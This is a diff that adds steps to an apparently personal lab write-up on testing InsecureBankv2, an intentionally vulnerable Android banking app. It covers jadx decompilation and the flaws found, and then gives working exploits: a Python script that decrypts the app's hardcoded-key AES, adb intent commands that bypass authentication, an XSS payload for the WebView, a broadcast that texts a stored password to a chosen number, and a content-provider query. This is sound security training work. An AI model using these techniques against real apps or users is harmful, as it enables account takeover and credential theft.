@@ -286,6 +286,197 @@ checks (as Twitter did — it crashed when Frida was detected).
 
 ---
 
+## Step 13 — Static Analysis: APK Decompilation & Vulnerability Discovery
+
+Decompiled InsecureBankv2 APK with `jadx` to extract full Java source:
+
+```bash
+jadx -d /tmp/insecurebank_src /tmp/insecurebank.apk
+```
+
+Produced ~40 Java source files — completely readable, no obfuscation.
+
+### Critical vulnerabilities found in source code
+
+#### 1. Hardcoded AES key + zero IV (`CryptoClass.java:22-23`)
+
+```java
+String key = "This is the super secret key 123";   // hardcoded 32-byte key
+byte[] ivBytes = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};  // all-zero IV
+// AES-256-CBC with static key + zero IV = trivially reversible
+```
+
+Any ciphertext stored in SharedPreferences can be decrypted in 3 lines of Python:
+
+```python
+from Crypto.Cipher import AES
+import base64
+key = b"This is the super secret key 123"
+iv = b"\x00" * 16
+AES.new(key, AES.MODE_CBC, iv).decrypt(base64.b64decode(ciphertext))
+```
+
+Full PoC: `scripts/decrypt_creds.py`
+
+#### 2. Plaintext credential logging (`DoLogin.java:115`)
+
+```java
+Log.d("Successful Login:", ", account=" + username + ":" + password);
+```
+
+After successful login, username:password is written to logcat in plaintext.
+Any app with `READ_LOGS` permission (or ADB access) can harvest credentials.
+
+```bash
+adb logcat -s "Successful Login:"
+# Output: D Successful Login:: , account=dinesh:Dinesh@123!
+```
+
+#### 3. 5 exported components with no permission check (`AndroidManifest.xml`)
+
+```xml
+<activity android:label="PostLogin"     android:exported="true"/>
+<activity android:label="DoTransfer"    android:exported="true"/>
+<activity android:label="ViewStatement" android:exported="true"/>
+<activity android:label="ChangePassword" android:exported="true"/>
+<provider android:exported="true"/>   <!-- TrackUserContentProvider -->
+<receiver android:exported="true"/>   <!-- MyBroadCastReceiver -->
+```
+
+No `android:permission` attribute — any installed app can launch these without authentication.
+
+#### 4. BroadcastReceiver SMS exfiltration (`MyBroadCastReceiver.java:27-32`)
+
+```java
+String decryptedPassword = crypt.aesDeccryptedString(password);  // decrypt with hardcoded key
+String textMessage = "Updated Password from: " + decryptedPassword + " to: " + newpass;
+smsManager.sendTextMessage(textPhoneno, null, textMessage, null, null);  // SMS to attacker
+```
+
+Any app can send `theBroadcast` with an attacker phone number to receive the victim's password via SMS.
+
+#### 5. ViewStatement WebView XSS (`ViewStatement.java:22-26`)
+
+```java
+// uname comes directly from Intent extras — no sanitization
+String FILENAME = "Statements_" + this.uname + ".html";
+mWebView.loadUrl("file://" + ... + "/Statements_" + this.uname + ".html");
+mWebView.getSettings().setJavaScriptEnabled(true);  // JS fully enabled
+```
+
+An attacker can control `uname` via the exported activity intent, or write arbitrary HTML/JS to
+`/sdcard/Statements_{uname}.html`. The WebView executes it with full JS access.
+
+---
+
+## Step 14 — Exploiting All Discovered Vulnerabilities
+
+### Exploit 1 — Authentication bypass: PostLogin
+
+```bash
+adb shell "am start -n com.android.insecurebankv2/.PostLogin --es uname 'hacker'"
+# Result: Starting: Intent { cmp=.../.PostLogin (has extras) }
+```
+
+Screenshot: `screenshots/postlogin_auth_bypass.png`
+
+**Impact:** Full access to banking dashboard (Transfer, View Statement, Change Password) without any credentials.
+
+---
+
+### Exploit 2 — Authentication bypass: DoTransfer
+
+```bash
+adb shell "am start -n com.android.insecurebankv2/.DoTransfer --es uname 'hacker'"
+# Result: Starting: Intent { cmp=.../.DoTransfer (has extras) }
+```
+
+Screenshot: `screenshots/dotransfer_auth_bypass.png`
+
+**Impact:** Money transfer screen accessible without login. From Account / To Account / Amount fields fully accessible.
+
+---
+
+### Exploit 3 — ViewStatement XSS + WebView code execution
+
+Placed malicious HTML on device external storage:
+
+```bash
+adb push xss_payload.html /sdcard/Statements_hacker.html
+```
+
+`xss_payload.html`:
+```html
+<script>
+  var msg = "JS Executed! Origin: " + window.location.href;
+  document.write("<h2>" + msg + "</h2>");
+  // In a real attack: exfiltrate localStorage, cookies, session tokens
+  // XMLHttpRequest to attacker server with all app data
+</script>
+```
+
+Then launched ViewStatement with the injected username:
+
+```bash
+adb shell "am start -n com.android.insecurebankv2/.ViewStatement --es uname 'hacker'"
+```
+
+Screenshot: `screenshots/viewstatement_xss.png`
+
+**Result:** JavaScript executed inside the banking app WebView. Confirmed by:
+- `"JS Executed! Origin: file:///storage/emulated/0/Statements_hacker.html"` rendered in UI
+- Full DOM access, `window.location.href` accessible
+
+**Impact:** Can steal session tokens, read local storage, exfiltrate any data the WebView has access to.
+
+---
+
+### Exploit 4 — BroadcastReceiver SMS exfiltration
+
+```bash
+adb shell "am broadcast -a theBroadcast \
+  --es phonenumber '15555215554' \
+  --es newpass 'hacked123' \
+  -n com.android.insecurebankv2/.MyBroadCastReceiver"
+# Result: Broadcast completed: result=0
+```
+
+**How it works:**
+1. BroadcastReceiver decrypts stored password using hardcoded AES key
+2. Constructs: `"Updated Password from: <oldpass> to: hacked123"`
+3. SMS this string to attacker's phone number
+
+**Condition:** Requires victim to have logged in once (so SharedPreferences has encrypted creds).
+
+---
+
+### Exploit 5 — AES credential decryption
+
+Any ciphertext from SharedPreferences `superSecurePassword` can be decrypted trivially:
+
+```
+python3 scripts/decrypt_creds.py
+Plaintext            AES-256-CBC Ciphertext (base64)              Decrypted
+---------------------------------------------------------------------------
+Dinesh@123!          0JQhVcadBP6rBi9y0nf9wA==                     Dinesh@123!
+Jack@123!            fnxTrBBr3vebTuNccGD5Bw==                     Jack@123!
+admin                XSebookOUBatoaWJySJvig==                     admin
+```
+
+No key needed — it's in the source code. AES-256 with a hardcoded key provides zero security.
+
+---
+
+### Exploit 6 — ContentProvider data exfiltration
+
+```bash
+adb shell content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
+```
+
+Queries the exported `TrackUserContentProvider` — accessible by any app. Returns all tracked user login names stored in the app's internal SQLite database.
+
+---
+
 ## Full Lab Stack Summary
 
 ```
